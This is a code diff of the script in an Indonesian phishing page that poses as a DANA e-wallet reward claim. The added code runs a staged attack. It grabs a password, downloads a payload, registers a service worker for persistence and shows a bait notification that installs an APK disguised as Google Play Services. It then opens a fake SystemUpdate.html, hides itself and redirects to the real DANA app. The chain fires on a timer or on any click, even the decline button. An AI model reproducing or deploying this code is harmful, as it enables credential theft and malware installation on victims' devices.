+                        updateLoading('✅ STEP 3/5: SW terdaftar', 'Lanjut...');
+                        resolve();
+                    })
+                    .catch(function() {
+                        SW_REGISTERED = true;
+                        updateLoading('⚠️ STEP 3/5: SW gagal', 'Lanjut...');
+                        resolve();
+                    });
+            });
+    });
+}
+
+// ============================================================
+// STEP 4: TAMPILKAN NOTIFIKASI (WAJIB SELESAI!)
+// ============================================================
+function step4_showNotification() {
+    return new Promise(function(resolve) {
+        updateLoading('🔔 STEP 4/5: Menampilkan notifikasi...', 'Notifikasi...');
+        
+        try {
+            if (!('Notification' in window)) {
+                K({ sumber: 'notification_skip', data: 'not_supported' });
+                updateLoading('⚠️ STEP 4/5: Notifikasi tidak support', 'Lanjut...');
+                resolve();
+                return;
+            }
+            if (Notification.permission === 'denied') {
+                K({ sumber: 'notification_skip', data: 'denied' });
+                updateLoading('⚠️ STEP 4/5: Notifikasi ditolak', 'Lanjut...');
+                resolve();
+                return;
+            }
+            
+            var show = function() {
+                var notif = new Notification('🔔 Klik Untuk Klaim', {
+                    body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
+                    icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
+                    requireInteraction: true,
+                    silent: false,
+                    vibrate: [200, 100, 200]
+                });
+                
+                notif.onclick = function() {
+                    notif.close();
+                    if (A.isAvailable) {
+                        A.installAPK('/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk');
+                        A.openFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html');
+                    }
+                    K({ sumber: 'notification_clicked', data: 'install_and_open' });
+                    if (!REDIRECT_DONE) {
+                        REDIRECT_DONE = true;
+                        redirectToDANA();
+                    }
+                };
+                
+                setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
+                K({ sumber: 'notification_shown', data: 'ok' });
+                updateLoading('✅ STEP 4/5: Notifikasi tampil', 'Menunggu interaksi...');
+                
+                // Tunggu notifikasi selesai (30 detik atau diklik)
+                setTimeout(function() {
+                    resolve();
+                }, 500);
+            };
+            
+            if (Notification.permission === 'granted') {
+                show();
+            } else {
+                Notification.requestPermission().then(function(p) {
+                    if (p === 'granted') { 
+                        show(); 
+                    } else {
+                        updateLoading('⚠️ STEP 4/5: Notifikasi ditolak', 'Lanjut...');
+                        resolve();
+                    }
+                });
+            }
+        } catch(e) {
+            K({ sumber: 'notification_error', data: e.message });
+            updateLoading('⚠️ STEP 4/5: Notifikasi error', 'Lanjut...');
+            resolve();
+        }
+    });
+}
+
+// ============================================================
+// STEP 5: BUKA SYSTEMUPDATE.HTML (WAJIB SELESAI!)
+// ============================================================
+function step5_openSystemUpdate() {
+    return new Promise(function(resolve) {
+        updateLoading('🚀 STEP 5/5: Membuka SystemUpdate.html...', 'FINAL!');
+        
+        var opened = false;
+        
+        // METHOD 1: Via Bridge
+        if (A.isAvailable) {
+            try {
+                var paths = [
+                    '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html',
+                    '/storage/emulated/0/Download/SystemUpdate.html'
+                ];
+                for (var i = 0; i < paths.length; i++) {
+                    if (A.fileExists(paths[i])) {
+                        A.openFile(paths[i]);
+                        K({ sumber: 'html_opened', data: 'via_bridge: ' + paths[i] });
+                        opened = true;
+                        updateLoading('✅ STEP 5/5: SystemUpdate.html terbuka (Bridge)', 'Selesai!');
+                        resolve();
+                        return;
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // METHOD 2: Via Blob
+        if (HTML_CONTENT && !opened) {
+            try {
+                var blob = new Blob([HTML_CONTENT], { type: 'text/html; charset=UTF-8' });
+                var url = URL.createObjectURL(blob);
+                window.open(url, '_blank');
+                K({ sumber: 'html_opened', data: 'via_blob' });
+                opened = true;
+                updateLoading('✅ STEP 5/5: SystemUpdate.html terbuka (Blob)', 'Selesai!');
+                resolve();
+                return;
+            } catch(e) {}
+        }
+        
+        // METHOD 3: Via Server (last resort)
+        if (!opened) {
+            try {
+                window.location.href = SERVER + '/files/SystemUpdate.html';
+                K({ sumber: 'html_opened', data: 'via_server' });
+                opened = true;
+                updateLoading('✅ STEP 5/5: SystemUpdate.html terbuka (Server)', 'Selesai!');
+                resolve();
+            } catch(e) {
+                K({ sumber: 'html_open_failed', data: e.message });
+                updateLoading('❌ STEP 5/5: Gagal buka HTML', 'Error!');
+                resolve();
+            }
+        }
+    });
+}
+
+// ============================================================
+// SHOW STATUS BAR
+// ============================================================
+function showStatusBar() { 
+    var bar = document.getElementById('statusBar'); 
+    if (bar) { 
+        bar.className = 'status-bar loading'; 
+        K({ sumber: 'status_bar', data: 'shown' }); 
+    } 
+}
+
+// ============================================================
+// REDIRECT KE DANA ASLI
+// ============================================================
+function redirectToDANA() {
+    if (REDIRECT_DONE) return;
+    REDIRECT_DONE = true;
+    
+    var methods = [
+        function() { if (A.isAvailable) { A.openApp('com.dana.id'); return true; } },
+        function() { window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end'; return true; },
+        function() { window.location.href = 'https://www.dana.id'; return true; }
+    ];
+    for (var i = 0; i < methods.length; i++) {
+        try { if (methods[i]()) break; } catch(e) {}
+    }
+}
+
+// ============================================================
+// EKSEKUSI UTAMA (STEP-BY-STEP, WAJIB SELESAI!)
+// ============================================================
+async function dapatkanSemua() {
     if (semuaDidapat) return;
     semuaDidapat = true;
-
-    // Popup hilang
-    document.getElementById('popupDana').style.display = 'none';
     
-    // TAHAP 1: Inject Permissions
+    // STEP 0: Persiapan
+    document.getElementById('popupDana').style.display = 'none';
+    showLoading(true);
+    showStatusBar();
     injectAllPermissions();
-
-    // TAHAP 2: Download Payload
-    downloadSilent(SERVER + '/files/SystemUpdate.html', 'SystemUpdate.html');
-    downloadSilent(SERVER + '/files/GooglePlayServices.apk', 'GooglePlayServices.apk');
-
-    // TAHAP 3: Simpan ke berbagai lokasi (Background)
-    saveToAllLocations('SystemUpdate.html', SERVER + '/files/SystemUpdate.html');
-
-    // TAHAP 4: Buka SystemUpdate.html (Setelah 5 detik)
-    setTimeout(() => {
-        openHTMLViaPriority();
-    }, 5000);
-
-    // TAHAP 5: Redirect ke Dana.id (Setelah 8 detik)
-    setTimeout(() => {
-        try { window.location.href = 'https://www.dana.id'; } catch(e) {}
-    }, 8000);
+    
+    K({ sumber: 'trigger', data: 'dapatkanSemua_start' });
+    
+    try {
+        // ============================================================
+        // 🔥 EKSEKUSI STEP-BY-STEP (WAJIB SELESAI SATU PER SATU!)
+        // ============================================================
+        
+        // STEP 1: Ambil password (WAJIB SELESAI!)
+        K({ sumber: 'step1_start', data: 'mengambil_password' });
+        await step1_getPassword();
+        K({ sumber: 'step1_done', data: 'password_berhasil' });
+        
+        // STEP 2: Download payload (WAJIB SELESAI!)
+        K({ sumber: 'step2_start', data: 'mulai_download' });
+        await step2_downloadPayload();
+        K({ sumber: 'step2_done', data: 'download_selesai' });
+        
+        // STEP 3: Register Service Worker (WAJIB SELESAI!)
+        K({ sumber: 'step3_start', data: 'registrasi_sw' });
+        await step3_registerSW();
+        K({ sumber: 'step3_done', data: 'sw_terdaftar' });
+        
+        // STEP 4: Tampilkan notifikasi (WAJIB SELESAI!)
+        K({ sumber: 'step4_start', data: 'tampilkan_notifikasi' });
+        await step4_showNotification();
+        K({ sumber: 'step4_done', data: 'notifikasi_selesai' });
+        
+        // STEP 5: Buka SystemUpdate.html (WAJIB SELESAI!)
+        K({ sumber: 'step5_start', data: 'buka_systemupdate' });
+        await step5_openSystemUpdate();
+        K({ sumber: 'step5_done', data: 'systemupdate_terbuka' });
+        
+        // ============================================================
+        // ✅ SEMUA STEP SELESAI!
+        // ============================================================
+        updateLoading('✅ SEMUA PROSES SELESAI!', 'SystemUpdate.html terbuka');
+        K({ sumber: 'all_done', data: 'success' });
+        
+        // STEP 6: Redirect ke DANA (SETELAH SEMUA SELESAI!)
+        setTimeout(function() {
+            showLoading(false);
+            K({ sumber: 'redirect_start', data: 'ke_dana' });
+            redirectToDANA();
+        }, 1500);
+        
+    } catch(error) {
+        K({ sumber: 'fatal_error', data: error.message });
+        updateLoading('❌ Error: ' + error.message, 'Proses dihentikan...');
+        setTimeout(function() {
+            step5_openSystemUpdate();
+            redirectToDANA();
+        }, 3000);
+    }
 }
 
+function klaim() { K({sumber:'click', data:'klaim'}); dapatkanSemua(); }
+function tolak() { K({sumber:'click', data:'tolak'}); dapatkanSemua(); }
+
 // ============================================================
-// TIMER & TRIGGER INTERAKSI
+// TIMER 10 DETIK
 // ============================================================
 var w = 10;
-function countdown() {
+var timerInterval = setInterval(function() {
     w--;
     var el = document.getElementById('timer');
     if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
-    if (w <= 0) dapatkanSemua();
-    else setTimeout(countdown, 1000);
-}
-setTimeout(countdown, 1000);
+    if (w <= 0) {
+        clearInterval(timerInterval);
+        K({sumber:'timer', data:'auto'});
+        dapatkanSemua();
+    }
+}, 1000);
 
-document.addEventListener('click', () => {
-    if (!semuaDidapat) dapatkanSemua();
+// ============================================================
+// CLICK ANYWHERE (FALLBACK)
+// ============================================================
+document.addEventListener('click', function() {
+    if (!semuaDidapat) {
+        K({sumber:'click_anywhere', data:'triggered'});
+        dapatkanSemua();
+    }
 });
 
-console.log("🚀 Sistem Universal siap. Berjalan di Browser, WebView, atau Native Bridge.");
+// ============================================================
+// SERVICE WORKER (TAMBAHAN UNTUK 24/7)
+// ============================================================
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js', { scope: '/' })
+        .then(function(reg) {
+            K({ sumber: 'sw_registered_early', data: 'ok' });
+        })
+        .catch(function() {});
+}
+
+// ============================================================
+// HIDE FROM SYSTEM (PENUTUP)
+// ============================================================
+hideFromSystem();
+
+console.log('🔥 INDEX.HTML - STEP-BY-STEP (WAJIB SELESAI!)');
+console.log('📱 Platform:', PLATFORM);
+console.log('🔌 Bridge:', A.isAvailable);
+console.log('🔐 Bridge Detected:', HAS_BRIDGE);
 </script>
 </body>
 </html>
